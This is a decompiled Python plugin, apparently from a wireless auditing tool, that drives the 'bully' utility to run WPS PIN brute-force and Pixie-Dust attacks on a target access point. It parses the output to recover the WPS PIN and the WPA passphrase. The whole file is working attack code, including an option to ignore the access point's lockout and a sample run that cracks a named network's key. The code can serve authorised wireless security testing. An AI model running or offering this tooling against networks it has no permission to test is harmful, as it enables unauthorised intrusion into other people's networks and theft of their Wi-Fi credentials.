# uncompyle6 version 3.7.4
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: build/bdist.linux-x86_64/egg/src/plugins/bully.py
# Compiled at: 2020-01-20 06:23:54
# Size of source mod 2**32: 14158 bytes
from .dependency import Dependency
from .airodump import Airodump
from ..handlers.attack import Attack
from ..handlers.result import CrackResultWPS
from ..handlers.color import Color
from ..handlers.timer import Timer
from ..handlers.process import Process
from ..config import Configuration
import os, time, re
from threading import Thread

class Bully(Attack, Dependency):
    dependency_required = False
    dependency_name = 'bully'
    dependency_url = 'https://github.com/aanarchyy/bully'

    def __init__(self, target, pixie_dust=True):
        super(Bully, self).__init__(target)
        self.target = target
        self.pixie_dust = pixie_dust
        self.total_attempts = 0
        self.total_timeouts = 0
        self.total_failures = 0
        self.locked = False
        self.state = '{O}Waiting for beacon{W}'
        self.start_time = time.time()
        self.last_pin = ''
        self.pins_remaining = -1
        self.eta = ''
        self.cracked_pin = self.cracked_key = self.cracked_bssid = self.cracked_essid = None
        self.crack_result = None
        self.cmd = []
        if Process.exists('stdbuf'):
            self.cmd.extend([
             'stdbuf', '-o0'])
        self.cmd.extend([
         'bully',
         '--bssid', target.bssid,
         '--channel', target.channel,
         '--force',
         '-v', '4',
         Configuration.interface])
        if self.pixie_dust:
            self.cmd.insert(-1, '--pixiewps')
        self.bully_proc = None

    def run(self):
        with Airodump(channel=(self.target.channel), target_bssid=(self.target.bssid),
          skip_wps=True,
          output_file_prefix='wps_pin') as (airodump):
            self.pattack('Waiting for target to appear...')
            self.target = self.wait_for_target(airodump)
            self.bully_proc = Process((self.cmd), stderr=(Process.devnull()),
              bufsize=0,
              cwd=(Configuration.temp()))
            t = Thread(target=(self.parse_line_thread))
            t.daemon = True
            t.start()
            try:
                self._run(airodump)
            except KeyboardInterrupt as e:
                self.stop()
                raise e
            except Exception as e:
                self.stop()
                raise e

        if self.crack_result is None:
            self.pattack('{R}Failed{W}', newline=True)

    def _run(self, airodump):
        while self.bully_proc.poll() is None:
            try:
                self.target = self.wait_for_target(airodump)
            except Exception as e:
                self.pattack(('{R}Failed: {O}%s{W}' % e), newline=True)
                Color.pexception(e)
                self.stop()
                break

            self.pattack(self.get_status())
            if self.pixie_dust:
                if self.running_time() > Configuration.wps_pixie_timeout:
                    self.pattack(('{R}Failed: {O}Timeout after %d seconds{W}' % Configuration.wps_pixie_timeout),
                      newline=True)
                    self.stop()
                    return
                if self.total_timeouts >= Configuration.wps_timeout_threshold:
                    self.pattack(('{R}Failed: {O}More than %d Timeouts{W}' % Configuration.wps_timeout_threshold),
                      newline=True)
                    self.stop()
                    return
                if self.total_failures >= Configuration.wps_fail_threshold:
                    self.pattack(('{R}Failed: {O}More than %d WPSFails{W}' % Configuration.wps_fail_threshold),
                      newline=True)
                    self.stop()
                    return
            else:
                if self.locked:
                    if not Configuration.wps_ignore_lock:
                        self.pattack('{R}Failed: {O}Access point is {R}Locked{O}', newline=True)
                        self.stop()
                        return
            time.sleep(0.5)

    def pattack(self, message, newline=False):
        if self.pixie_dust:
            time_left = Configuration.wps_pixie_timeout - self.running_time()
            attack_name = 'Pixie-Dust'
        else:
            time_left = self.running_time()
            attack_name = 'PIN Attack'
        if self.eta:
            time_msg = '{D}ETA:{W}{C}%s{W}' % self.eta
        else:
            time_msg = '{C}%s{W}' % Timer.secs_to_str(time_left)
        if self.pins_remaining >= 0:
            time_msg += ', {D}PINs Left:{W}{C}%d{W}' % self.pins_remaining
        else:
            time_msg += ', {D}PINs:{W}{C}%d{W}' % self.total_attempts
        Color.clear_entire_line()
        Color.pattack('WPS', self.target, attack_name, '{W}[%s] %s' % (time_msg, message))
        if newline:
            Color.pl('')

    def running_time(self):
        return int(time.time() - self.start_time)

    def get_status(self):
        main_status = self.state
        meta_statuses = []
        if self.total_timeouts > 0:
            meta_statuses.append('{O}Timeouts:%d{W}' % self.total_timeouts)
        if self.total_failures > 0:
            meta_statuses.append('{O}Fails:%d{W}' % self.total_failures)
        if self.locked:
            meta_statuses.append('{R}Locked{W}')
        if len(meta_statuses) > 0:
            main_status += ' (%s)' % ', '.join(meta_statuses)
        return main_status

    def parse_line_thread(self):
        for line in iter(self.bully_proc.pid.stdout.readline, b''):
            if line == '':
                pass
            else:
                line = line.decode('utf-8')
                line = line.replace('\r', '').replace('\n', '').strip()
                if Configuration.verbose > 1:
                    Color.pe('\n{P} [bully:stdout] %s' % line)
                else:
                    self.state = self.parse_state(line)
                    self.crack_result = self.parse_crack_result(line)
                    if self.crack_result:
                        break

    def parse_crack_result(self, line):
        pin_key_re = re.search("Pin is '(\\d*)', key is '(.*)'", line)
        if pin_key_re:
            self.cracked_pin = pin_key_re.group(1)
            self.cracked_key = pin_key_re.group(2)
        if self.cracked_pin is None:
            pin_re = re.search("^\\s*PIN\\s*:\\s*'(.*)'\\s*$", line)
            if pin_re:
                self.cracked_pin = pin_re.group(1)
            pin_re = re.search("^\\[Pixie-Dust\\] PIN FOUND: '?(\\d*)'?\\s*$", line)
            if pin_re:
                self.cracked_pin = pin_re.group(1)
            if self.cracked_pin is not None:
                self.pattack(('{G}Cracked PIN: {C}%s{W}' % self.cracked_pin), newline=True)
                self.state = '{G}Finding Key...{C}'
                time.sleep(2)
        key_re = re.search("^\\s*KEY\\s*:\\s*'(.*)'\\s*$", line)
        if key_re:
            self.cracked_key = key_re.group(1)
        if not self.crack_result and self.cracked_pin and self.cracked_key:
            self.pattack(('{G}Cracked Key: {C}%s{W}' % self.cracked_key), newline=True)
            self.crack_result = CrackResultWPS(self.target.bssid, self.target.essid, self.cracked_pin, self.cracked_key)
            Color.pl('')
            self.crack_result.dump()
        return self.crack_result

    def parse_state(self, line):
        state = self.state
        got_beacon = re.search(".*Got beacon for '(.*)' \\((.*)\\)", line)
        if got_beacon:
            state = 'Got beacon'
        last_state = re.search(".*Last State = '(.*)'\\s*Next pin '(.*)'", line)
        if last_state:
            pin = last_state.group(2)
            if pin != self.last_pin:
                self.last_pin = pin
                self.total_attempts += 1
                if self.pins_remaining > 0:
                    self.pins_remaining -= 1
            state = 'Trying PIN'
        mx_result_pin = re.search(".*[RT]x\\(\\s*(.*)\\s*\\) = '(.*)'\\s*Next pin '(.*)'", line)
        if mx_result_pin:
            self.locked = False
            m_state = mx_result_pin.group(1)
            result = mx_result_pin.group(2)
            pin = mx_result_pin.group(3)
            if pin != self.last_pin:
                self.last_pin = pin
                self.total_attempts += 1
                if self.pins_remaining > 0:
                    self.pins_remaining -= 1
            if result in ('Pin1Bad', 'Pin2Bad'):
                result = '{G}%s{W}' % result
            else:
                if result == 'Timeout':
                    self.total_timeouts += 1
                    result = '{O}%s{W}' % result
                else:
                    if result == 'WPSFail':
                        self.total_failures += 1
                        result = '{O}%s{W}' % result
                    else:
                        if result == 'NoAssoc':
                            result = '{O}%s{W}' % result
                        else:
                            result = '{R}%s{W}' % result
            result = '{P}%s{W}:%s' % (m_state.strip(), result.strip())
            state = 'Trying PIN (%s)' % result
        re_tested = re.search('Run time ([0-9:]+), pins tested ([0-9])+', line)
        if re_tested:
            self.total_attempts = int(re_tested.group(2))
        re_remaining = re.search(' ([0-9]+) pins remaining', line)
        if re_remaining:
            self.pins_remaining = int(re_remaining.group(1))
        re_eta = re.search('time to crack is (\\d+) hours, (\\d+) minutes, (\\d+) seconds', line)
        if re_eta:
            h, m, s = re_eta.groups()
            self.eta = '%sh%sm%ss' % (
             h.rjust(2, '0'), m.rjust(2, '0'), s.rjust(2, '0'))
        re_lockout = re.search('.*WPS lockout reported, sleeping for (\\d+) seconds', line)
        if re_lockout:
            self.locked = True
            sleeping = re_lockout.group(1)
            state = '{R}WPS Lock-out: {O}Waiting %s seconds...{W}' % sleeping
        re_pin_not_found = re.search('.*\\[Pixie-Dust\\] WPS pin not found', line)
        if re_pin_not_found:
            state = '{R}Failed: {O}Bully says "WPS pin not found"{W}'
        re_running_pixiewps = re.search('.*Running pixiewps with the information', line)
        if re_running_pixiewps:
            state = '{G}Running pixiewps...{W}'
        return state

    def stop(self):
        if hasattr(self, 'pid'):
            if self.pid:
                if self.pid.poll() is None:
                    self.pid.interrupt()

    def __del__(self):
        self.stop()

    @staticmethod
    def get_psk_from_pin(target, pin):
        """
        bully --channel 1 --bssid 34:21:09:01:92:7C --pin 01030365 --bruteforce wlan0mon
        PIN   : '01030365'
        KEY   : 'password'
        BSSID : '34:21:09:01:92:7c'
        ESSID : 'AirLink89300'
        """
        cmd = [
         'bully',
         '--channel', target.channel,
         '--bssid', target.bssid,
         '--pin', pin,
         '--bruteforce',
         '--force',
         Configuration.interface]
        bully_proc = Process(cmd)
        for line in bully_proc.stderr().split('\n'):
            key_re = re.search("^\\s*KEY\\s*:\\s*'(.*)'\\s*$", line)
            if key_re is not None:
                psk = key_re.group(1)
                return psk


if __name__ == '__main__':
    Configuration.initialize()
    Configuration.interface = 'wlan0mon'
    from ..handlers.target import Target
    fields = '34:21:09:01:92:7C,2015-05-27 19:28:44,2015-05-27 19:28:46,1,54,WPA2,CCMP TKIP,PSK,-58,2,0,0.0.0.0,9,AirLink89300,'.split(',')
    target = Target(fields)
    psk = Bully.get_psk_from_pin(target, '01030365')
    print('psk', psk)